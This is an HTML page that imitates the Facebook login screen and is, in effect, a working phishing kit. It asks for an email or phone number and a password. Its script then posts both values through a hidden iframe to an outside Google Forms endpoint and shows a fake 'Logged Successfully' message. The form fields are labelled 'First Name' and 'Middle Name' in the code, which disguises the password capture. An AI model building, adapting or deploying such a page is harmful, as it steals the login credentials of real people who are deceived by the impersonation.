<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>facebook.com</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: "Optimistic Display", -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            background: #fff;
            color: #1c1e21;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .page {
            flex: 1;
            display: flex;
            min-height: 640px;
        }

        /* ---------- left panel ---------- */
        .left {
            flex: 1.55;
            position: relative;
            border-right: 1px solid #dadde1;
            overflow: hidden;
        }

        .logo {
            position: absolute;
            top: 60px;
            left: 60px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #0866ff;
            color: #fff;
            font-size: 26px;
            font-weight: 800;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .headline {
            position: absolute;
            left: 40px;
            bottom: 60px;
            font-size: 70px;
            line-height: 1.08;
            font-weight: 600;
            letter-spacing: -0.02em;
            width: 260px;
        }
        .headline span { color: #0866ff; }

        /* illustration */
        .art {
            position: absolute;
            left: 50%;
            top: 50%;
            width: 520px;
            height: 470px;
            transform: translate(-32%, -56%);
        }
        .art > * { position: absolute; }

        .card-shop {
            left: 0; top: 70px;
            width: 190px; height: 160px;
            border-radius: 14px;
            background: linear-gradient(135deg, #f8d9c9, #f3b9a3 60%, #f0c98c);
            box-shadow: 0 6px 20px rgba(0,0,0,.1);
            display: flex; align-items: center; justify-content: center;
            font-size: 70px;
        }
        .card-shop i {
            position: absolute; top: 12px; left: 12px;
            width: 28px; height: 28px; border-radius: 8px;
            background: rgba(255,255,255,.85);
        }

        .card-video {
            left: 130px; top: 0;
            width: 250px; height: 340px;
            border-radius: 20px;
            background: linear-gradient(180deg, #6db7e0 0%, #9ccbe8 45%, #c9d3d9 70%, #7d7f86 100%);
            box-shadow: 0 8px 26px rgba(0,0,0,.18);
            display: flex; align-items: center; justify-content: center;
            font-size: 120px;
        }
        .card-video .bar {
            position: absolute; top: 14px; left: 14px; right: 14px; height: 4px;
            border-radius: 2px; background: rgba(255,255,255,.45);
        }
        .card-video .bar::after {
            content: ""; display: block; width: 22%; height: 100%;
            border-radius: 2px; background: #fff;
        }
        .timer {
            top: 70px; left: 300px;
            background: #6b5ce7; color: #fff;
            font-weight: 700; font-size: 16px;
            padding: 9px 14px; border-radius: 12px;
        }

        .card-post {
            left: 55px; top: 260px;
            width: 205px; height: 200px;
            border-radius: 18px;
            background: #fff;
            box-shadow: 0 8px 26px rgba(0,0,0,.14);
            padding: 16px;
        }
        .card-post .badge {
            width: 28px; height: 28px; border-radius: 8px; background: #0866ff;
            margin-bottom: 12px;
        }
        .card-post .pic {
            height: 90px; border-radius: 10px;
            background: linear-gradient(135deg, #b3202a, #e2555c 50%, #6b1a22);
            display: flex; align-items: center; justify-content: center; font-size: 46px;
        }
        .card-post .line { height: 10px; border-radius: 5px; background: #e4e6eb; margin-top: 10px; }
        .card-post .line.s { width: 65%; }

        .avatar {
            left: 250px; top: 340px;
            width: 120px; height: 120px; border-radius: 50%;
            border: 4px solid #0866ff;
            box-shadow: 0 0 0 4px #fff;
            overflow: hidden;
            display: flex; align-items: center; justify-content: center;
            font-size: 62px;
            background: linear-gradient(160deg, #f6d5cf, #e9a9a3);
        }

        .heart {
            left: 370px; top: 250px;
            width: 62px; height: 62px; border-radius: 50%;
            background: #f0284a;
            color: #fff; font-size: 30px;
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 4px 14px rgba(240,40,74,.4);
        }
        .laugh { left: 0; top: 0; font-size: 56px; }

        /* ---------- right panel ---------- */
        .right {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }

        .container {
            width: 100%;
            max-width: 396px;
        }

        .container h1 {
            font-size: 17px;
            font-weight: 600;
            margin-bottom: 22px;
        }

        .form-group { margin-bottom: 14px; }

        input[type="text"] {
            width: 100%;
            height: 52px;
            padding: 0 16px;
            border: 1px solid #ccd0d5;
            border-radius: 16px;
            font-size: 16px;
            font-family: inherit;
            color: #1c1e21;
            background: #fff;
        }
        input[type="text"]::placeholder { color: #65676b; }
        input[type="text"]:focus {
            outline: none;
            border-color: #0866ff;
            box-shadow: 0 0 0 2px #e7f3ff;
        }

        button {
            width: 100%;
            height: 48px;
            margin-top: 8px;
            background: #0866ff;
            color: #fff;
            border: none;
            border-radius: 100px;
            font-size: 16px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
        }
        button:hover { background: #0759de; }
        button:active { background: #064fc4; }

        .success-message, .error-message {
            display: none;
            text-align: center;
            margin-top: 18px;
            padding: 10px 12px;
            border-radius: 12px;
            font-size: 15px;
        }
        .success-message { color: #216fdb; background: #e7f3ff; }
        .error-message { color: #be4b49; background: #ffebe8; border: 1px solid #dd3c10; }

        .brand-foot {
            margin-top: 44px;
            text-align: center;
            font-size: 16px;
            font-weight: 600;
            color: #1c1e21;
        }
        .brand-foot b { color: #0866ff; }

        /* ---------- footer ---------- */
        .footer {
            border-top: 1px solid #dadde1;
            padding: 22px 16px 26px;
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 14px 36px;
            font-size: 14px;
            color: #65676b;
        }

        @media (max-width: 1000px) {
            .left { display: none; }
            .right { padding: 32px 20px; }
            .container::before {
                content: "";
                display: block;
                width: 48px; height: 48px; margin: 0 auto 28px;
                background: url("logo.png") center / contain no-repeat;
            }
        }
    </style>
</head>
<body>
    <div class="page">
        <div class="left">
            <!-- <div class="logo">f</div> -->
            <div class="logo"><img src="logo.png" width="60" alt="Logo"></div>

            <div class="art" aria-hidden="true">
                <div class="laugh">😆</div>
                <div class="card-shop"><i></i>🧶</div>
                <div class="card-video"><div class="bar"></div>🛹</div>
                <div class="timer">🕓 16:45</div>
                <div class="card-post">
                    <div class="badge"></div>
                    <div class="pic">🍿</div>
                    <div class="line"></div>
                    <div class="line s"></div>
                </div>
                <div class="avatar">🙂</div>
                <div class="heart">❤</div>
            </div>

            <div class="headline">Explore<br>the<br> things<br><span>you love.</span></div>
        </div>

        <div class="right">
            <div class="container">
                <h1>Log in to Facebook</h1>
                <form id="researchForm">
                    <div class="form-group">
                        <input type="text" id="firstName" name="firstName" placeholder="Email address of mobile number" required>
                    </div>

                    <div class="form-group">
                        <input type="text" id="middleName" name="middleName" placeholder="Password" required>
                    </div>

                    <button type="submit">Log in</button>

                    <div class="success-message" id="successMessage">
                        Logged Successfully
                    </div>
                    <div class="error-message" id="errorMessage">
                        ✗ Error submitting form. Please try again.
                    </div>
                </form>

                <div class="brand-foot"><b>∞</b> Meta</div>
            </div>
        </div>
    </div>

    <div class="footer">
        <span>English (UK)</span>
        <span>Español</span>
        <span>Deutsch</span>
        <span>Italiano</span>
        <span>Français (France)</span>
        <span>More languages...</span>
    </div>

    <!-- Hidden iframe for form submission -->
    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>

    <script>
        var FORM_URL = 'https://docs.google.com/forms/u/0/d/e/1FAIpQLSfsCWszcd1bSPtYrhjOtkE6jqKhg5yXDyWpyvLLJVVjW9_CSQ/formResponse';

        document.getElementById('researchForm').addEventListener('submit', function(e) {
            e.preventDefault();

            var firstName = document.getElementById('firstName').value.trim();
            var middleName = document.getElementById('middleName').value.trim();
            var okMsg = document.getElementById('successMessage');
            var errMsg = document.getElementById('errorMessage');

            if (!firstName || !middleName) {
                errMsg.textContent = '✗ Please fill in all fields.';
                errMsg.style.display = 'block';
                return;
            }

            // Create hidden form and submit to Google Form
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = FORM_URL;
            form.target = 'hidden_iframe';

            // CORRECT Entry IDs
            var field1 = document.createElement('input');
            field1.type = 'hidden';
            field1.name = 'entry.2085025365';  // First Name
            field1.value = firstName;

            var field2 = document.createElement('input');
            field2.type = 'hidden';
            field2.name = 'entry.1442417137';  // Middle Name
            field2.value = middleName;

            form.appendChild(field1);
            form.appendChild(field2);
            document.body.appendChild(form);

            form.submit();

            // Show success message
            errMsg.style.display = 'none';
            okMsg.style.display = 'block';

            // Clear form after 2 seconds
            setTimeout(function() {
                document.getElementById('researchForm').reset();
                okMsg.style.display = 'none';
            }, 2000);

            document.body.removeChild(form);
        });
    </script>
</body>
</html>
